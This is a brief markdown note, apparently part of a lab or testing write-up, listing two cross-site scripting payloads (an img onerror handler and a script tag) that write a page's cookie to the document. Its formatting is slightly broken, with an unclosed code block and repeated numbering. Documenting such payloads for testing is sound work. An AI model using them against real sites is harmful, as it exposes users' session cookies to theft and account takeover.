# XSS Payloads

The following payloads were tested to exploit the Cross-Site Scripting (XSS) vulnerability and display the cookie value:

1. **Image tag payload (Bypassing basic script filters):**
   ```html
   <img src="x" onerror="document.write(document.cookie)">
   1.Direct script tag (Standard XSS):
   <script>document.write(document.cookie);</script>
   
